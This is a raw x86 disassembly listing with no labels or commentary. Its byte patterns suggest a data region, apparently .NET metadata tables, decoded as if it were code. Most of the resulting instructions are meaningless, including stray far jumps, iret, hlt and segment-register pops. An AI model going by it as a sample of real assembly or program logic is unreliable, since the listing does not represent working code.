  407015:	00 a1 02 1b 07 c7    	add    %ah,-0x38f8e4fe(%ecx)
  40701b:	00 89 02 05 0d 4b    	add    %cl,0x4b0d0502(%ecx)
  407021:	02 89 02 77 0a 4b    	add    0x4b0a7702(%ecx),%cl
  407027:	02 59 01             	add    0x1(%ecx),%bl
  40702a:	a1 1b 3e 01 59       	mov    0x59013e1b,%eax
  40702f:	01 4b 1d             	add    %ecx,0x1d(%ebx)
  407032:	c3                   	ret
  407033:	00 a1 02 64 1b c7    	add    %ah,-0x38e49bfe(%ecx)
  407039:	00 f9                	add    %bh,%cl
  40703b:	02 01                	add    (%ecx),%al
  40703d:	15 6b 01 f9 02       	adc    $0x2f9016b,%eax
  407042:	08 0b                	or     %cl,(%ebx)
  407044:	23 02                	and    (%edx),%eax
  407046:	01 03                	add    %eax,(%ebx)
  407048:	01 15 0e 00 01 03    	add    %edx,0x301000e
  40704e:	4d                   	dec    %ebp
  40704f:	07                   	pop    %es
  407050:	47                   	inc    %edi
  407051:	02 c1                	add    %cl,%al
  407053:	01 95 14 47 02 c1    	add    %edx,-0x3efdb8ec(%ebp)
  407059:	01 bf 17 42 02 09    	add    %edi,0x9024217(%edi)
  40705f:	03 01                	add    (%ecx),%eax
  407061:	15 6b 01 09 03       	adc    $0x309016b,%eax
  407066:	5a                   	pop    %edx
  407067:	19 6a 05             	sbb    %ebp,0x5(%edx)
  40706a:	11 03                	adc    %eax,(%ebx)
  40706c:	e9 14 70 05 19       	jmp    0x1945e085
  407071:	03 ea                	add    %edx,%ebp
  407073:	1a 76 05             	sbb    0x5(%esi),%dh
  407076:	21 03                	and    %eax,(%ebx)
  407078:	d1 0f                	rorl   $1,(%edi)
  40707a:	7c 05                	jl     0x407081
  40707c:	c1 01 06             	roll   $0x6,(%ecx)
  40707f:	1a 47 02             	sbb    0x2(%edi),%al
  407082:	19 03                	sbb    %eax,(%ebx)
  407084:	d6                   	salc
  407085:	1b bf 01 81 02 c8    	sbb    -0x37fd7eff(%edi),%edi
  40708b:	05 86 05 29 03       	add    $0x3290586,%eax
  407090:	6e                   	outsb  %ds:(%esi),(%dx)
  407091:	00 f4                	add    %dh,%ah
  407093:	01 59 01             	add    %ebx,0x1(%ecx)
  407096:	4b                   	dec    %ebx
  407097:	1b 7b 00             	sbb    0x0(%ebx),%edi
  40709a:	59                   	pop    %ecx
  40709b:	01 7b 07             	add    %edi,0x7(%ebx)
  40709e:	c3                   	ret
  40709f:	00 59 01             	add    %bl,0x1(%ecx)
  4070a2:	3d 07 c3 00 59       	cmp    $0x5900c307,%eax
  4070a7:	01 00                	add    %eax,(%eax)
  4070a9:	11 93 05 c1 01 bd    	adc    %edx,-0x42fe3efb(%ebx)
  4070af:	18 99 05 49 03 01    	sbb    %bl,0x1034905(%ecx)
  4070b5:	15 0e 00 61 01       	adc    $0x161000e,%eax
  4070ba:	52                   	push   %edx
  4070bb:	02 cd                	add    %ch,%cl
  4070bd:	03 51 03             	add    0x3(%ecx),%edx
  4070c0:	19 0d 75 01 69 00    	sbb    %ecx,0x690175
  4070c6:	01 15 0e 00 21 02    	add    %edx,0x221000e
  4070cc:	66 0c 70             	data16 or $0x70,%al
  4070cf:	01 69 00             	add    %ebp,0x0(%ecx)
  4070d2:	c9                   	leave
  4070d3:	04 aa                	add    $0xaa,%al
  4070d5:	05 c1 01 ca 0c       	add    $0xcca01c1,%eax
  4070da:	b0 05                	mov    $0x5,%al
  4070dc:	c1 01 43             	roll   $0x43,(%ecx)
  4070df:	14 47                	adc    $0x47,%al
  4070e1:	02 c1                	add    %cl,%al
  4070e3:	01 e2                	add    %esp,%edx
  4070e5:	04 bd                	add    $0xbd,%al
  4070e7:	05 59 01 da 0f       	add    $0xfda0159,%eax
  4070ec:	1d 00 61 03 66       	sbb    $0x66036100,%eax
  4070f1:	0c 47                	or     $0x47,%al
  4070f3:	02 69 03             	add    0x3(%ecx),%ch
  4070f6:	48                   	dec    %eax
  4070f7:	0d c3 00 b1 02       	or     $0x2b100c3,%eax
  4070fc:	b6 07                	mov    $0x7,%dh
  4070fe:	c3                   	ret
  4070ff:	05 59 03 c8 07       	add    $0x7c80359,%eax
  407104:	c3                   	ret
  407105:	05 59 03 66 0c       	add    $0xc660359,%eax
  40710a:	47                   	inc    %edi
  40710b:	02 71 03             	add    0x3(%ecx),%dh
  40710e:	f6 1a                	negb   (%edx)
  407110:	c9                   	leave
  407111:	05 79 03 01 15       	add    $0x15010379,%eax
  407116:	cf                   	iret
  407117:	05 79 03 71 06       	add    $0x6710379,%eax
  40711c:	d6                   	salc
  40711d:	05 c1 00 64 08       	add    $0x86400c1,%eax
  407122:	0e                   	push   %cs
  407123:	00 19                	add    %bl,(%ecx)
  407125:	00 64 08 0e          	add    %ah,0xe(%eax,%ecx,1)
  407129:	00 09                	add    %cl,(%ecx)
  40712b:	03 01                	add    (%ecx),%eax
  40712d:	15 36 02 0c 00       	adc    $0xc0236,%eax
  407132:	01 15 0e 00 0c 00    	add    %edx,0xc000e
  407138:	22 03                	and    (%ebx),%al
  40713a:	f5                   	cmc
  40713b:	05 0c 00 41 1b       	add    $0x1b41000c,%eax
  407140:	f4                   	hlt
  407141:	01 0c 00             	add    %ecx,(%eax,%eax,1)
  407144:	72 1c                	jb     0x407162
  407146:	fb                   	sti
  407147:	05 c1 01 df 10       	add    $0x10df01c1,%eax
  40714c:	01 06                	add    %eax,(%esi)
  40714e:	51                   	push   %ecx
  40714f:	00 ee                	add    %ch,%dh
  407151:	17                   	pop    %ss
  407152:	11 06                	adc    %eax,(%esi)
  407154:	51                   	push   %ecx
  407155:	00 f4                	add    %dh,%ah
  407157:	01 17                	add    %edx,(%edi)
  407159:	06                   	push   %es
  40715a:	59                   	pop    %ecx
  40715b:	00 6b 03             	add    %ch,0x3(%ebx)
  40715e:	17                   	pop    %ss
  40715f:	06                   	push   %es
  407160:	89 03                	mov    %eax,(%ebx)
  407162:	6b 1d 1d 06 69 00 01 	imul   $0x1,0x69061d,%ebx
  407169:	15 01 03 61 00       	adc    $0x610301,%eax
  40716e:	01 15 2d 06 91 03    	add    %edx,0x391062d
  407174:	64 08 0e             	or     %cl,%fs:(%esi)
  407177:	00 99 03 01 15 56    	add    %bl,0x56150103(%ecx)
  40717d:	04 a1                	add    $0xa1,%al
  40717f:	03 b5 0b 35 06 81    	add    -0x7ef9caf5(%ebp),%esi
  407185:	02 17                	add    (%edi),%dl
  407187:	05 0a 00 91 02       	add    $0x291000a,%eax
  40718c:	a1 1c 35 05 91       	mov    0x9105351c,%eax
  407191:	02 be 0a 43 06 89    	add    -0x76f9bcf6(%esi),%bh
  407197:	01 79 05             	add    %edi,0x5(%ecx)
  40719a:	47                   	inc    %edi
  40719b:	02 91 02 a1 1c 54    	add    0x541ca102(%ecx),%dl
  4071a1:	06                   	push   %es
  4071a2:	91                   	xchg   %eax,%ecx
  4071a3:	02 b5 0a 7c 05 91    	add    -0x6efa83f6(%ebp),%dh
  4071a9:	02 9e 0a 6b 01 91    	add    -0x6efe94f6(%esi),%bl
  4071af:	02 bb 1c 5e 06 91    	add    -0x6ef9a1e4(%ebx),%bh
  4071b5:	02 68 05             	add    0x5(%eax),%ch
  4071b8:	6b 01 1c             	imul   $0x1c,(%ecx),%eax
  4071bb:	00 22                	add    %ah,(%edx)
  4071bd:	03 f5                	add    %ebp,%esi
  4071bf:	05 b9 03 aa 1b       	add    $0x1baa03b9,%eax
  4071c4:	7c 06                	jl     0x4071cc
  4071c6:	1c 00                	sbb    $0x0,%al
  4071c8:	e9 14 92 06 24       	jmp    0x244703e1
  4071cd:	00 ea                	add    %ch,%dl
  4071cf:	1a a4 06 1c 00 e9 0a 	sbb    0xae9001c(%esi,%eax,1),%ah
  4071d6:	a9 06 24 00 d6       	test   $0xd6002406,%eax
  4071db:	1b bf 01 c9 03 bc    	sbb    -0x43fc36ff(%edi),%edi
  4071e1:	10 b3 06 c9 03 18    	adc    %dh,0x1803c906(%ebx)
  4071e7:	03 b9 06 d1 03 2b    	add    0x2b03d106(%ecx),%edi
  4071ed:	08 c1                	or     %al,%cl
  4071ef:	06                   	push   %es
  4071f0:	e1 03                	loope  0x4071f5
  4071f2:	ea 04 c8 06 d9 03 08 	ljmp   $0x803,$0xd906c804
  4071f9:	06                   	push   %es
  4071fa:	cf                   	iret
  4071fb:	06                   	push   %es
  4071fc:	f1                   	int1
  4071fd:	03 b9 08 d8 06 01    	add    0x106d808(%ecx),%edi
  407203:	04 d1                	add    $0xd1,%al
  407205:	12 e2                	adc    %dl,%ah
  407207:	06                   	push   %es
  407208:	2c 00                	sub    $0x0,%al
  40720a:	b9 08 17 07 2c       	mov    $0x2c071708,%ecx
  40720f:	00 6d 19             	add    %ch,0x19(%ebp)
  407212:	23 07                	and    (%edi),%eax
  407214:	34 00                	xor    $0x0,%al
  407216:	95                   	xchg   %eax,%ebp
  407217:	05 3b 07 1c 00       	add    $0x1c073b,%eax
  40721c:	01 15 0e 00 c1 01    	add    %edx,0x1c1000e
  407222:	a9 1d 84 00 21       	test   $0x2100841d,%eax
  407227:	04 01                	add    $0x1,%al
  407229:	15 6b 01 19 04       	adc    $0x419016b,%eax
  40722e:	01 15 59 07 29 04    	add    %edx,0x4290759
  407234:	b5 16                	mov    $0x16,%ch
  407236:	61                   	popa
  407237:	07                   	pop    %es
  407238:	51                   	push   %ecx
  407239:	01 31                	add    %esi,(%ecx)
  40723b:	0c 93                	or     $0x93,%al
  40723d:	01 49 04             	add    %ecx,0x4(%ecx)
  407240:	01 15 6b 01 59 02    	add    %edx,0x259016b
  407246:	01 15 0e 00 31 04    	add    %edx,0x431000e
  40724c:	01 15 0e 00 51 04    	add    %edx,0x451000e
  407252:	5d                   	pop    %ebp
  407253:	0b 01                	or     (%ecx),%eax
  407255:	03 51 04             	add    0x4(%ecx),%edx
  407258:	fa                   	cli
  407259:	0a 01                	or     (%ecx),%al
  40725b:	03 51 04             	add    0x4(%ecx),%edx
  40725e:	f9                   	stc
  40725f:	04 7a                	add    $0x7a,%al
  407261:	07                   	pop    %es
  407262:	51                   	push   %ecx
  407263:	04 a9                	add    $0xa9,%al
  407265:	0b 81 07 51 04 99    	or     -0x66fbaef9(%ecx),%eax
  40726b:	1c 2b                	sbb    $0x2b,%al
  40726d:	02 51 04             	add    0x4(%ecx),%dl
  407270:	8c 02                	mov    %es,(%edx)
  407272:	0e                   	push   %cs
  407273:	00 51 04             	add    %dl,0x4(%ecx)
  407276:	26 15 88 07 39 04    	es adc $0x4390788,%eax
  40727c:	01 15 8e 07 51 04    	add    %edx,0x451078e
  407282:	7e 02                	jle    0x407286
  407284:	31 02                	xor    %eax,(%edx)
  407286:	39 04 4c             	cmp    %eax,(%esp,%ecx,2)
  407289:	0e                   	push   %cs
  40728a:	0e                   	push   %cs
  40728b:	00 41 04             	add    %al,0x4(%ecx)
  40728e:	01 15 2b 02 59 02    	add    %edx,0x259022b
  407294:	72 1c                	jb     0x4072b2
  407296:	31 02                	xor    %eax,(%edx)
  407298:	51                   	push   %ecx
  407299:	03 19                	add    (%ecx),%ebx
  40729b:	0d 9a 07 79 04       	or     $0x479079a,%eax
  4072a0:	01 15 6b 01 51 04    	add    %edx,0x451016b
  4072a6:	85 02                	test   %eax,(%edx)
  4072a8:	2b 02                	sub    (%edx),%eax
  4072aa:	51                   	push   %ecx
  4072ab:	04 16                	add    $0x16,%al
  4072ad:	15 88 07 c1 00       	adc    $0xc10788,%eax
  4072b2:	7d 0d                	jge    0x4072c1
  4072b4:	23 02                	and    (%edx),%eax
  4072b6:	81 04 2c 1d be 07 91 	addl   $0x9107be1d,(%esp,%ebp,1)
  4072bd:	04 55                	add    $0x55,%al
  4072bf:	1c d0                	sbb    $0xd0,%al
  4072c1:	07                   	pop    %es
  4072c2:	a1 04 01 15 0e       	mov    0xe150104,%eax
  4072c7:	00 c1                	add    %al,%cl
  4072c9:	01 c9                	add    %ecx,%ecx
  4072cb:	18 f9                	sbb    %bh,%cl
  4072cd:	07                   	pop    %es
  4072ce:	49                   	dec    %ecx
  4072cf:	02 b5 16 99 01 49    	add    0x49019916(%ebp),%dh
  4072d5:	02 b5 16 ab 01 a9    	add    -0x56fe54ea(%ebp),%dh
  4072db:	00 01                	add    %al,(%ecx)
  4072dd:	15 0e 00 1c 00       	adc    $0x1c000e,%eax
  4072e2:	d1 0f                	rorl   $1,(%edi)
  4072e4:	06                   	push   %es
  4072e5:	08 1c 00             	or     %bl,(%eax,%eax,1)
  4072e8:	41                   	inc    %ecx
  4072e9:	1b f4                	sbb    %esp,%esi
  4072eb:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  4072ee:	c6                   	(bad)
  4072ef:	12 0e                	adc    (%esi),%cl
  4072f1:	00 c1                	add    %al,%cl
  4072f3:	01 72 17             	add    %esi,0x17(%edx)
  4072f6:	42                   	inc    %edx
  4072f7:	02 c1                	add    %cl,%al
  4072f9:	00 94 0a 28 08 49 02 	add    %dl,0x2490828(%edx,%ecx,1)
  407300:	b5 16                	mov    $0x16,%ch
  407302:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407303:	01 51 01             	add    %edx,0x1(%ecx)
  407306:	ad                   	lods   %ds:(%esi),%eax
  407307:	00 32                	add    %dh,(%edx)
  407309:	08 c1                	or     %al,%cl
  40730b:	01 3b                	add    %edi,(%ebx)
  40730d:	10 47 02             	adc    %al,0x2(%edi)
  407310:	a9 04 72 08 37       	test   $0x37087204,%eax
  407315:	08 51 01             	or     %dl,0x1(%ecx)
  407318:	ad                   	lods   %ds:(%esi),%eax
  407319:	00 3c 08             	add    %bh,(%eax,%ecx,1)
  40731c:	51                   	push   %ecx
  40731d:	01 ad 00 41 08 51    	add    %ebp,0x51084100(%ebp)
  407323:	01 ad 00 46 08 51    	add    %ebp,0x51084600(%ebp)
  407329:	01 ce                	add    %ecx,%esi
  40732b:	00 4d 08             	add    %cl,0x8(%ebp)
  40732e:	41                   	inc    %ecx
  40732f:	03 72 08             	add    0x8(%edx),%esi
  407332:	52                   	push   %edx
  407333:	08 51 01             	or     %dl,0x1(%ecx)
  407336:	ce                   	into
  407337:	00 57 08             	add    %dl,0x8(%edi)
  40733a:	51                   	push   %ecx
  40733b:	01 ce                	add    %ecx,%esi
  40733d:	00 5c 08 51          	add    %bl,0x51(%eax,%ecx,1)
  407341:	01 ce                	add    %ecx,%esi
  407343:	00 61 08             	add    %ah,0x8(%ecx)
  407346:	51                   	push   %ecx
  407347:	01 b4 05 68 08 b1 04 	add    %esi,0x4b10868(%ebp,%eax,1)
  40734e:	72 08                	jb     0x407358
  407350:	6d                   	insl   (%dx),%es:(%edi)
  407351:	08 49 02             	or     %cl,0x2(%ecx)
  407354:	b5 16                	mov    $0x16,%ch
  407356:	7a 08                	jp     0x407360
  407358:	59                   	pop    %ecx
  407359:	03 42 1d             	add    0x1d(%edx),%eax
  40735c:	23 02                	and    (%edx),%eax
  40735e:	e1 02                	loope  0x407362
  407360:	01 15 88 08 c1 00    	add    %edx,0xc10888
  407366:	8b 0a                	mov    (%edx),%ecx
  407368:	f4                   	hlt
  407369:	01 89 01 01 15 6b    	add    %ecx,0x6b150101(%ecx)
  40736f:	01 49 02             	add    %ecx,0x2(%ecx)
  407372:	e0 00                	loopne 0x407374
  407374:	b6 08                	mov    $0x8,%dh
  407376:	49                   	dec    %ecx
  407377:	02 31                	add    (%ecx),%dh
  407379:	06                   	push   %es
  40737a:	bd 08 49 02 b4       	mov    $0xb4024908,%ebp
  40737f:	05 c4 08 49 02       	add    $0x24908c4,%eax
  407384:	65 00 cb             	gs add %cl,%bl
  407387:	08 49 02             	or     %cl,0x2(%ecx)
  40738a:	ad                   	lods   %ds:(%esi),%eax
  40738b:	00 d2                	add    %dl,%dl
  40738d:	08 49 02             	or     %cl,0x2(%ecx)
  407390:	e9 00 d9 08 49       	jmp    0x49494c95
  407395:	02 ce                	add    %dh,%cl
  407397:	00 e0                	add    %ah,%al
  407399:	08 49 02             	or     %cl,0x2(%ecx)
  40739c:	b5 16                	mov    $0x16,%ch
  40739e:	12 09                	adc    (%ecx),%cl
  4073a0:	d1 04 01             	roll   $1,(%ecx,%eax,1)
  4073a3:	15 28 09 09 00       	adc    $0x90928,%eax
  4073a8:	80 00 0d             	addb   $0xd,(%eax)
  4073ab:	01 09                	add    %ecx,(%ecx)
  4073ad:	00 84 00 12 01 09 00 	add    %al,0x90112(%eax,%eax,1)
  4073b4:	88 00                	mov    %al,(%eax)
  4073b6:	17                   	pop    %ss
  4073b7:	01 08                	add    %ecx,(%eax)
  4073b9:	00 98 00 5c 01 08    	add    %bl,0x8015c00(%eax)
  4073bf:	00 9c 00 61 01 08 00 	add    %bl,0x80161(%eax,%eax,1)
  4073c6:	a0 00 66 01 08       	mov    0x8016600,%al
  4073cb:	00 a4 00 5c 01 08 00 	add    %ah,0x8015c(%eax,%eax,1)
  4073d2:	ec                   	in     (%dx),%al
  4073d3:	00 7f 02             	add    %bh,0x2(%edi)
  4073d6:	08 00                	or     %al,(%eax)
  4073d8:	f0 00 17             	lock add %dl,(%edi)
  4073db:	01 08                	add    %ecx,(%eax)
  4073dd:	00 f4                	add    %dh,%ah
  4073df:	00 12                	add    %dl,(%edx)
  4073e1:	01 08                	add    %ecx,(%eax)
  4073e3:	00 f8                	add    %bh,%al
  4073e5:	00 84 02 08 00 fc 00 	add    %al,0xfc0008(%edx,%eax,1)
  4073ec:	89 02                	mov    %eax,(%edx)
  4073ee:	08 00                	or     %al,(%eax)
  4073f0:	00 01                	add    %al,(%ecx)
  4073f2:	8e 02                	mov    (%edx),%es
  4073f4:	08 00                	or     %al,(%eax)
  4073f6:	04 01                	add    $0x1,%al
  4073f8:	93                   	xchg   %eax,%ebx
  4073f9:	02 08                	add    (%eax),%cl
  4073fb:	00 08                	add    %cl,(%eax)
  4073fd:	01 98 02 08 00 0c    	add    %ebx,0xc000802(%eax)
  407403:	01 9d 02 08 00 10    	add    %ebx,0x10000802(%ebp)
  407409:	01 a2 02 08 00 14    	add    %esp,0x14000802(%edx)
  40740f:	01 a7 02 08 00 18    	add    %esp,0x18000802(%edi)
  407415:	01 ac 02 2e 00 2b 00 	add    %ebp,0x2b002e(%edx,%eax,1)
  40741c:	06                   	push   %es
  40741d:	03 2e                	add    (%esi),%ebp
  40741f:	00 33                	add    %dh,(%ebx)
  407421:	00 0f                	add    %cl,(%edi)
  407423:	03 2e                	add    (%esi),%ebp
  407425:	00 3b                	add    %bh,(%ebx)
  407427:	00 34 03             	add    %dh,(%ebx,%eax,1)
  40742a:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  40742e:	3d 03 2e 00 4b       	cmp    $0x4b002e03,%eax
  407433:	00 3d 03 2e 00 53    	add    %bh,0x53002e03
  407439:	00 3d 03 2e 00 5b    	add    %bh,0x5b002e03
  40743f:	00 3d 03 2e 00 63    	add    %bh,0x63002e03
  407445:	00 3d 03 2e 00 6b    	add    %bh,0x6b002e03
  40744b:	00 3d 03 2e 00 73    	add    %bh,0x73002e03
  407451:	00 3d 03 2e 00 7b    	add    %bh,0x7b002e03
  407457:	00 43 03             	add    %al,0x3(%ebx)
  40745a:	2e 00 83 00 50 03 2e 	add    %al,%cs:0x2e035000(%ebx)
  407461:	00 8b 00 3d 03 c0    	add    %cl,-0x3ffcc300(%ebx)
  407467:	00 93 00 17 01 e0    	add    %dl,-0x1ffee900(%ebx)
  40746d:	00 93 00 17 01 00    	add    %dl,0x11700(%ebx)
  407473:	01 93 00 17 01 20    	add    %edx,0x20011700(%ebx)
  407479:	01 93 00 17 01 40    	add    %edx,0x40011700(%ebx)
  40747f:	01 93 00 17 01 60    	add    %edx,0x60011700(%ebx)
  407485:	01 93 00 17 01 80    	add    %edx,-0x7ffee900(%ebx)
  40748b:	01 93 00 17 01 a0    	add    %edx,-0x5ffee900(%ebx)
  407491:	01 93 00 17 01 c0    	add    %edx,-0x3ffee900(%ebx)
  407497:	01 93 00 17 01 e0    	add    %edx,-0x1ffee900(%ebx)
  40749d:	01 93 00 17 01 00    	add    %edx,0x11700(%ebx)
  4074a3:	02 93 00 17 01 03    	add    0x3011700(%ebx),%dl
  4074a9:	02 93 00 17 01 20    	add    0x20011700(%ebx),%dl
  4074af:	02 93 00 17 01 40    	add    0x40011700(%ebx),%dl
  4074b5:	02 93 00 17 01 60    	add    0x60011700(%ebx),%dl
  4074bb:	02 93 00 17 01 61    	add    0x61011700(%ebx),%dl
  4074c1:	02 93 00 17 01 63    	add    0x63011700(%ebx),%dl
  4074c7:	02 93 00 17 01 80    	add    -0x7ffee900(%ebx),%dl
  4074cd:	02 93 00 17 01 81    	add    -0x7efee900(%ebx),%dl
  4074d3:	02 93 00 17 01 a0    	add    -0x5ffee900(%ebx),%dl
  4074d9:	02 93 00 17 01 a1    	add    -0x5efee900(%ebx),%dl
  4074df:	02 93 00 17 01 c0    	add    -0x3ffee900(%ebx),%dl
  4074e5:	02 93 00 17 01 c1    	add    -0x3efee900(%ebx),%dl
  4074eb:	02 93 00 17 01 e0    	add    -0x1ffee900(%ebx),%dl
  4074f1:	02 93 00 17 01 e1    	add    -0x1efee900(%ebx),%dl
  4074f7:	02 93 00 17 01 e3    	add    -0x1cfee900(%ebx),%dl
  4074fd:	02 9b 00 b6 03 00    	add    0x3b600(%ebx),%bl
  407503:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  407509:	03 93 00 17 01 20    	add    0x20011700(%ebx),%edx
  40750f:	03 93 00 17 01 21    	add    0x21011700(%ebx),%edx
  407515:	03 93 00 17 01 40    	add    0x40011700(%ebx),%edx
  40751b:	03 93 00 17 01 41    	add    0x41011700(%ebx),%edx
  407521:	03 93 00 17 01 61    	add    0x61011700(%ebx),%edx
  407527:	03 93 00 17 01 81    	add    -0x7efee900(%ebx),%edx
  40752d:	03 93 00 17 01 a1    	add    -0x5efee900(%ebx),%edx
  407533:	03 93 00 17 01 a3    	add    -0x5cfee900(%ebx),%edx
  407539:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  40753f:	00 20                	add    %ah,(%eax)
  407541:	00 00                	add    %al,(%eax)
  407543:	00 14 00             	add    %dl,(%eax,%eax,1)
  407546:	01 00                	add    %eax,(%eax)
  407548:	06                   	push   %es
  407549:	00 00                	add    %al,(%eax)
  40754b:	00 1e                	add    %bl,(%esi)
  40754d:	00 c0                	add    %al,%al
  40754f:	03 c9                	add    %ecx,%ecx
  407551:	03 f4                	add    %esp,%esi
  407553:	03 9c 04 c2 04 e6 04 	add    0x4e604c2(%esp,%eax,1),%ebx
  40755a:	54                   	push   %esp
  40755b:	05 59 05 81 05       	add    $0x5810559,%eax
  407560:	8a 05 8f 05 9f 05    	mov    0x59f058f,%al
  407566:	b6 05                	mov    $0x5,%dh
  407568:	dd 05 08 06 27 06    	fldl   0x6270608
  40756e:	3c 06                	cmp    $0x6,%al
  407570:	4c                   	dec    %esp
  407571:	06                   	push   %es
  407572:	66 06                	pushw  %es
  407574:	af                   	scas   %es:(%edi),%eax
  407575:	06                   	push   %es
  407576:	53                   	push   %ebx
  407577:	07                   	pop    %es
  407578:	67 07                	addr16 pop %es
  40757a:	a3 07 cb 07 da       	mov    %eax,0xda07cb07
  40757f:	07                   	pop    %es
  407580:	e8 07 f0 07 ff       	call   0xff48658c
  407585:	07                   	pop    %es
  407586:	0c 08                	or     $0x8,%al
  407588:	11 08                	adc    %ecx,(%eax)
  40758a:	20 08                	and    %cl,(%eax)
  40758c:	2d 08 72 08 80       	sub    $0x80087208,%eax
  407591:	08 96 08 a2 08 a8    	or     %dl,-0x57f75df8(%esi)
  407597:	08 ae 08 e7 08 f1    	or     %ch,-0xef718f8(%esi)
  40759d:	08 f7                	or     %dh,%bh
  40759f:	08 fc                	or     %bh,%ah
  4075a1:	08 02                	or     %al,(%edx)
  4075a3:	09 0b                	or     %ecx,(%ebx)
  4075a5:	09 18                	or     %ebx,(%eax)
  4075a7:	09 31                	or     %esi,(%ecx)
  4075a9:	09 04 00             	or     %eax,(%eax,%eax,1)
  4075ac:	01 00                	add    %eax,(%eax)
  4075ae:	16                   	push   %ss
  4075af:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4075b2:	17                   	pop    %ss
  4075b3:	00 0d 00 18 00 0f    	add    %cl,0xf001800
  4075b9:	00 00                	add    %al,(%eax)
  4075bb:	00 60 1a             	add    %ah,0x1a(%eax)
  4075be:	9f                   	lahf
  4075bf:	00 00                	add    %al,(%eax)
  4075c1:	00 44 1a a4          	add    %al,-0x5c(%edx,%ebx,1)
  4075c5:	00 00                	add    %al,(%eax)
  4075c7:	00 9d 13 a9 00 00    	add    %bl,0xa913(%ebp)
  4075cd:	00 29                	add    %ch,(%ecx)
  4075cf:	0b ae 00 00 00 da    	or     -0x26000000(%esi),%ebp
  4075d5:	19 ae 00 00 00 df    	sbb    %ebp,-0x21000000(%esi)
  4075db:	0a b2 00 00 00 56    	or     0x56000000(%edx),%dh
  4075e1:	03 b7 00 00 00 f6    	add    -0xa000000(%edi),%esi
  4075e7:	02 bb 00 00 00 93    	add    -0x6d000000(%ebx),%bh
  4075ed:	0b b2 00 00 00 fd    	or     -0x3000000(%edx),%esi
  4075f3:	0e                   	push   %cs
  4075f4:	bf 00 00 00 f8       	mov    $0xf8000000,%edi
  4075f9:	0c b7                	or     $0xb7,%al
  4075fb:	00 00                	add    %al,(%eax)
  4075fd:	00 a4 1a c3 01 00 00 	add    %ah,0x1c3(%edx,%ebx,1)
  407604:	d5 0f                	aad    $0xf
  407606:	f8                   	clc
  407607:	01 00                	add    %eax,(%eax)
  407609:	00 98 0d fe 01 00    	add    %bl,0x1fe0d(%eax)
  40760f:	00 a6 0c 69 02 00    	add    %ah,0x2690c(%esi)
  407615:	00 dd                	add    %bl,%ch
  407617:	13 6d 02             	adc    0x2(%ebp),%ebp
  40761a:	00 00                	add    %al,(%eax)
  40761c:	08 19                	or     %bl,(%ecx)
  40761e:	71 02                	jno    0x407622
  407620:	00 00                	add    %al,(%eax)
  407622:	89 1c 75 02 00 00 fe 	mov    %ebx,-0x1fffffe(,%esi,2)
  407629:	07                   	pop    %es
  40762a:	7a 02                	jp     0x40762e
  40762c:	02 00                	add    (%eax),%al
  40762e:	06                   	push   %es
  40762f:	00 03                	add    %al,(%ebx)
  407631:	00 01                	add    %al,(%ecx)
  407633:	00 07                	add    %al,(%edi)
  407635:	00 03                	add    %al,(%ebx)
  407637:	00 02                	add    %al,(%edx)
  407639:	00 08                	add    %cl,(%eax)
  40763b:	00 05 00 01 00 09    	add    %al,0x9000100
  407641:	00 05 00 02 00 0a    	add    %al,0xa000200
  407647:	00 07                	add    %al,(%edi)
  407649:	00 01                	add    %al,(%ecx)
  40764b:	00 0b                	add    %cl,(%ebx)
  40764d:	00 07                	add    %al,(%edi)
  40764f:	00 02                	add    %al,(%edx)
  407651:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407654:	09 00                	or     %eax,(%eax)
  407656:	01 00                	add    %eax,(%eax)
  407658:	0d 00 09 00 02       	or     $0x2000900,%eax
  40765d:	00 0e                	add    %cl,(%esi)
  40765f:	00 0b                	add    %cl,(%ebx)
  407661:	00 01                	add    %al,(%ecx)
  407663:	00 0f                	add    %cl,(%edi)
  407665:	00 0b                	add    %cl,(%ebx)
  407667:	00 02                	add    %al,(%edx)
  407669:	00 10                	add    %dl,(%eax)
  40766b:	00 0d 00 01 00 11    	add    %cl,0x11000100
  407671:	00 0d 00 02 00 12    	add    %cl,0x12000200
  407677:	00 0f                	add    %cl,(%edi)
  407679:	00 01                	add    %al,(%ecx)
  40767b:	00 13                	add    %dl,(%ebx)
  40767d:	00 0f                	add    %cl,(%edi)
  40767f:	00 02                	add    %al,(%edx)
  407681:	00 14 00             	add    %dl,(%eax,%eax,1)
  407684:	11 00                	adc    %eax,(%eax)
  407686:	02 00                	add    (%eax),%al
  407688:	15 00 13 00 01       	adc    $0x1001300,%eax
  40768d:	00 16                	add    %dl,(%esi)
  40768f:	00 13                	add    %dl,(%ebx)
  407691:	00 02                	add    %al,(%edx)
  407693:	00 17                	add    %dl,(%edi)
  407695:	00 15 00 01 00 18    	add    %dl,0x18000100
  40769b:	00 15 00 02 00 19    	add    %dl,0x19000200
  4076a1:	00 17                	add    %dl,(%edi)
  4076a3:	00 01                	add    %al,(%ecx)
  4076a5:	00 1a                	add    %bl,(%edx)
  4076a7:	00 17                	add    %dl,(%edi)
  4076a9:	00 02                	add    %al,(%edx)
  4076ab:	00 60 00             	add    %ah,0x0(%eax)
  4076ae:	19 00                	sbb    %eax,(%eax)
  4076b0:	02 00                	add    (%eax),%al
  4076b2:	68 00 1b 00 02       	push   $0x2001b00
  4076b7:	00 69 00             	add    %ch,0x0(%ecx)
  4076ba:	1d 00 02 00 8b       	sbb    $0x8b000200,%eax
  4076bf:	00 1f                	add    %bl,(%edi)
  4076c1:	00 01                	add    %al,(%ecx)
  4076c3:	00 8c 00 1f 00 02 00 	add    %cl,0x2001f(%eax,%eax,1)
  4076ca:	8d 00                	lea    (%eax),%eax
  4076cc:	21 00                	and    %eax,(%eax)
  4076ce:	01 00                	add    %eax,(%eax)
  4076d0:	8e 00                	mov    (%eax),%es
  4076d2:	21 00                	and    %eax,(%eax)
  4076d4:	02 00                	add    (%eax),%al
  4076d6:	8f 00                	pop    (%eax)
  4076d8:	23 00                	and    (%eax),%eax
  4076da:	01 00                	add    %eax,(%eax)
  4076dc:	90                   	nop
  4076dd:	00 23                	add    %ah,(%ebx)
  4076df:	00 02                	add    %al,(%edx)
  4076e1:	00 91 00 25 00 02    	add    %dl,0x2002500(%ecx)
  4076e7:	00 92 00 27 00 16    	add    %dl,0x16002700(%edx)
  4076ed:	00 c0                	add    %al,%al
